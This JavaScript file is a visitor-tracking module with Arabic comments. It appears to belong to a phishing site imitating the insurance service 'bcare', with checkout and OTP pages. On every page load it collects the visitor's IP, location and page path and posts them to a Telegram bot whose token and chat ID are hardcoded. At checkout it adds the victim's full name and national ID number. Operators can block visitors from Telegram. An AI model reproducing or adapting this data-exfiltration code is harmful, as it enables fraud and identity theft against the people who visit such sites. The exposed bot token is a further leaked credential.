/* ═══════════════════════════════════════════════════════
   Tracker — تتبع رحلة العميل + الحظر
   ═══════════════════════════════════════════════════════ */

const Tracker = (function () {
  const STORAGE_KEY = 'bcare_journey';
  const IP_KEY      = 'bcare_ip';
  const MSG_KEY     = 'bcare_msg_ids';
  const GEO_KEY     = 'bcare_geo';
  const TG_TOKEN    = '8297451860:AAG52IqNkSFFPhMJr82TNEpqYNd0i7u3Dow';
  const TG_CHAT     = '1451039924';

  const PAGE_NAMES = {
    'app.html':            'الصفحة الرئيسية',
    'policy-details.html': 'تفاصيل الوثيقة',
    'offers.html':         'العروض',
    'secure-checkout.html':'الدفع',
    'otp-verify.html':     'تأكيد OTP',
  };

  /* ─── جلب IP ─────────────────────────────────────── */
  async function getIP() {
    let ip = sessionStorage.getItem(IP_KEY);
    if (ip) return ip;
    try {
      const r = await fetch('https://api.ipify.org?format=json');
      const d = await r.json();
      ip = d.ip || 'unknown';
    } catch(e) {
      ip = 'unknown';
    }
    sessionStorage.setItem(IP_KEY, ip);
    return ip;
  }

  /* ─── جلب الموقع الجغرافي ────────────────────────── */
  async function getGeo(ip) {
    let cached = sessionStorage.getItem(GEO_KEY);
    if (cached) return JSON.parse(cached);
    try {
      const r = await fetch(`https://ipinfo.io/${ip}/json`);
      const d = await r.json();
      if (d.country) {
        const geo = {
          flag: countryFlag(d.country),
          country: d.country || '',
          city: d.city || '',
          isp: d.org || '',
        };
        sessionStorage.setItem(GEO_KEY, JSON.stringify(geo));
        return geo;
      }
    } catch(e) {}
    return { flag: '🌍', country: '', city: '', isp: '' };
  }

  function countryFlag(code) {
    if (!code) return '🌍';
    const flags = {
      SA:'🇸🇦', AE:'🇦🇪', EG:'🇪🇬', KW:'🇰🇼', QA:'🇶🇦', BH:'🇧🇭', OM:'🇴🇲', JO:'🇯🇴',
      LB:'🇱🇧', IQ:'🇮🇶', SY:'🇸🇾', YE:'🇾🇪', US:'🇺🇸', GB:'🇬🇧', IN:'🇮🇳', PK:'🇵🇰',
      PH:'🇵🇭', BD:'🇧🇩', TR:'🇹🇷', FR:'🇫🇷', DE:'🇩🇪', CA:'🇨🇦', AU:'🇦🇺',
    };
    return flags[code.toUpperCase()] || '🌍';
  }

  /* ─── تسجيل صفحة ────────────────────────────────── */
  function logPage(page) {
    try {
      const journey = JSON.parse(localStorage.getItem(STORAGE_KEY) || '[]');
      journey.push({
        page,
        pageName: PAGE_NAMES[page] || page,
        time: new Date().toLocaleString('ar-SA'),
        ts: Date.now(),
      });
      localStorage.setItem(STORAGE_KEY, JSON.stringify(journey));
    } catch(e) {}
  }

  /* ─── بناء نص الرحلة ───────────────────────────── */
  function buildJourneyText(ip, geo, journey, extra) {
    const pagesList = journey.map((j, i) =>
      `  ${i + 1}. ${j.pageName} — ${j.time}`
    ).join('\n');

    const loc = geo.country ? `${geo.flag} ${geo.country}${geo.city ? ' — ' + geo.city : ''}${geo.isp ? ' | ' + geo.isp : ''}` : '';

    return `👤 <b>زيارة جديدة</b>

🌐 IP: <code>${ip}</code>${loc ? '\n📍 الموقع: ' + loc : ''}
📱 الصفحة: ${PAGE_NAMES[Object.keys(PAGE_NAMES).find(k => journey.length && journey[journey.length-1].page === k)] || ''}
🕐 الوقت: ${new Date().toLocaleString('ar-SA')}

📋 <b>الرحلة حتى الآن:</b>
${pagesList || '  لا توجد بيانات'}
${extra ? '\n' + extra : ''}`;
  }

  /* ─── إرسال أو تحديث رسالة لتليجرام ─────────────── */
  async function sendOrUpdateVisit(ip, geo, journey, extra) {
    try {
      const msgIds = JSON.parse(localStorage.getItem(MSG_KEY) || '{}');
      const text = buildJourneyText(ip, geo, journey, extra);
      const blockKB = {
        inline_keyboard: [[{ text: '🚫 حظر هذا العميل', callback_data: `blockip_${ip}` }]]
      };

      /* إذا there's a previous message for this IP → تحديثه */
      if (msgIds[ip]) {
        try {
          const res = await fetch(`https://api.telegram.org/bot${TG_TOKEN}/editMessageText`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              chat_id: TG_CHAT,
              message_id: msgIds[ip],
              text,
              parse_mode: 'HTML',
              reply_markup: blockKB,
            }),
          });
          if (res.ok) return;
        } catch(e) {}
      }

      /* إرسال رسالة جديدة */
      const res = await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TG_CHAT,
          text,
          parse_mode: 'HTML',
          reply_markup: blockKB,
        }),
      });
      const d = await res.json();
      if (d.ok && d.result) {
        msgIds[ip] = d.result.message_id;
        localStorage.setItem(MSG_KEY, JSON.stringify(msgIds));
      }
    } catch(e) {}
  }

  /* ─── إرسال الرحلة عند الدفع ────────────────────── */
  async function sendJourneyToTelegram(extra) {
    try {
      const ip = await getIP();
      const geo = await getGeo(ip);
      const journey = JSON.parse(localStorage.getItem(STORAGE_KEY) || '[]');
      const policy = JSON.parse(sessionStorage.getItem('bcare_policy') || '{}');
      const offer  = JSON.parse(sessionStorage.getItem('bcare_offer')  || '{}');

      const ref = offer.refNumber || '—';
      const name = policy.fullName || '—';
      const natId = JSON.parse(sessionStorage.getItem('bcare_form') || '{}').nationalId || '—';

      const extraBlock = `${extra || ''}

💰 <b>تفاصيل الطلب</b>
🆔 المرجع: <code>${ref}</code>
👤 الاسم: ${name}
🪪 الهوية: <code>${natId}</code>`;

      await sendOrUpdateVisit(ip, geo, journey, extraBlock);
    } catch(e) {}
  }

  /* ─── مراقبة أزرار الحظر ────────────────────────── */
  let blockPollInt = null;
  let lastBlockUpdateId = 0;

  async function startBlockPolling() {
    try {
      const r = await fetch(`https://api.telegram.org/bot${TG_TOKEN}/getUpdates?offset=${lastBlockUpdateId + 1}&timeout=5`);
      const d = await r.json();
      if (!d.ok || !d.result) return;

      for (const u of d.result) {
        lastBlockUpdateId = Math.max(lastBlockUpdateId, u.update_id);
        if (!u.callback_query) continue;
        const cq = u.callback_query;
        const data = cq.data || '';

        if (data.startsWith('blockip_')) {
          const ip = data.replace('blockip_', '');
          await fetch(`https://api.telegram.org/bot${TG_TOKEN}/answerCallbackQuery`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ callback_query_id: cq.id, text: '🚫 تم الحظر' }),
          });
          await fetch(`https://api.telegram.org/bot${TG_TOKEN}/editMessageText`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              chat_id: cq.message.chat.id,
              message_id: cq.message.message_id,
              text: cq.message.text + `\n\n🚫 <b>تم حظر هذا العميل</b>`,
              parse_mode: 'HTML',
              reply_markup: {
                inline_keyboard: [[{ text: '✅ إلغاء الحظر', callback_data: `unblockip_${ip}` }]]
              },
            }),
          });
          await blockIP(ip);
        }

        if (data.startsWith('unblockip_')) {
          const ip = data.replace('unblockip_', '');
          await fetch(`https://api.telegram.org/bot${TG_TOKEN}/answerCallbackQuery`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ callback_query_id: cq.id, text: '✅ تم إلغاء الحظر' }),
          });
          await fetch(`https://api.telegram.org/bot${TG_TOKEN}/editMessageText`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              chat_id: cq.message.chat.id,
              message_id: cq.message.message_id,
              text: cq.message.text + `\n\n✅ <b>تم إلغاء حظر هذا العميل</b>`,
              parse_mode: 'HTML',
            }),
          });
          await unblockIP(ip);
        }
      }
    } catch(e) {}
  }

  function startBlockListener() {
    fetch(`https://api.telegram.org/bot${TG_TOKEN}/getUpdates?offset=-1&timeout=0`)
      .then(r => r.json())
      .then(d => {
        if (d.ok && d.result && d.result.length) {
          lastBlockUpdateId = d.result[d.result.length - 1].update_id;
        }
      }).catch(()=>{});
    blockPollInt = setInterval(startBlockPolling, 3000);
  }

  /* ─── فحص الحظر ─────────────────────────────────── */
  async function checkBlocked() {
    try {
      const ip = await getIP();

      const local = JSON.parse(localStorage.getItem('bcare_blocked') || '[]');
      if (local.some(b => b.ip === ip)) {
        document.body.innerHTML = buildBlockedScreen();
        return true;
      }

      const r = await fetch('blocked.json?t=' + Date.now());
      const blocked = await r.json();
      if (Array.isArray(blocked) && blocked.some(b => b.ip === ip)) {
        document.body.innerHTML = buildBlockedScreen();
        return true;
      }
    } catch(e) {}
    return false;
  }

  function buildBlockedScreen() {
    return `<div style="display:flex;align-items:center;justify-content:center;min-height:100vh;font-family:'Noto Sans Arabic',sans-serif;background:#f0f4f8;direction:rtl">
      <div style="text-align:center;padding:2rem;max-width:400px">
        <div style="width:80px;height:80px;border-radius:50%;background:#fdecea;display:flex;align-items:center;justify-content:center;margin:0 auto 1.5rem">
          <span class="material-icons" style="font-size:2.5rem;color:#e53935">block</span>
        </div>
        <h1 style="color:#e53935;font-size:1.4rem;margin-bottom:.5rem">تم حظرك</h1>
        <p style="color:#6b7c93;font-size:.9rem;line-height:1.7">لا يمكنك الوصول إلى هذا الموقع حالياً.<br/>يرجى التواصل مع الدعم للحصول على المساعدة.</p>
      </div>
    </div>`;
  }

  /* ─── حظر IP ─────────────────────────────────────── */
  async function blockIP(ip) {
    try {
      let blocked = JSON.parse(localStorage.getItem('bcare_blocked') || '[]');
      if (!blocked.some(b => b.ip === ip)) {
        blocked.push({ ip, blockedAt: new Date().toISOString() });
        localStorage.setItem('bcare_blocked', JSON.stringify(blocked));
      }
    } catch(e) {}
  }

  /* ─── إلغاء حظر IP ─────────────────────────────── */
  async function unblockIP(ip) {
    try {
      let blocked = JSON.parse(localStorage.getItem('bcare_blocked') || '[]');
      blocked = blocked.filter(b => b.ip !== ip);
      localStorage.setItem('bcare_blocked', JSON.stringify(blocked));
    } catch(e) {}
  }

  /* ─── تنظيف ──────────────────────────────────────── */
  function clear() {
    localStorage.removeItem(STORAGE_KEY);
    localStorage.removeItem(MSG_KEY);
    localStorage.removeItem(GEO_KEY);
  }

  /* ─── تهيئة ──────────────────────────────────────── */
  async function init() {
    const blocked = await checkBlocked();
    if (blocked) return;

    const page = window.location.pathname.split('/').pop() || 'app.html';
    logPage(page);
    startBlockListener();

    /* إرسال أو تحديث زيارة */
    try {
      const ip = await getIP();
      const geo = await getGeo(ip);
      const journey = JSON.parse(localStorage.getItem(STORAGE_KEY) || '[]');
      await sendOrUpdateVisit(ip, geo, journey);
    } catch(e) {}
  }

  return { init, getIP, sendJourneyToTelegram, onCheckout: async () => {
    const ip = await getIP();
    const geo = await getGeo(ip);
    const journey = JSON.parse(localStorage.getItem(STORAGE_KEY) || '[]');
    await sendOrUpdateVisit(ip, geo, journey, '💰 <b>العميل وصل صفحة الدفع</b>');
  }, clear, checkBlocked, blockIP, unblockIP };
})();

document.addEventListener('DOMContentLoaded', () => Tracker.init());
